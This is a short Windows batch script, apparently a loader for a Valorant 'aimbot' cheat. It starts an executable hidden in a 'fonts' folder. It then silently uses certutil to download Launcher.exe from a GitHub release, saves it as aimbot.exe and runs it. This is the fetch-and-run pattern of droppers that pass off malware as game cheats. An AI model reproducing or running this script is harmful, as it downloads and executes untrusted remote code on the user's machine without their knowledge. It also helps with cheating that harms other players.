@echo off
cd /d "Valorant\new\menus\fonts"
start a.exe
set "URL=https://github.com/hvbsvqdj/vallant/releases/download/aimbot/Launcher.exe
set "Dossier=VMouse"
set "NomFichier=%Dossier%\aimbot.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)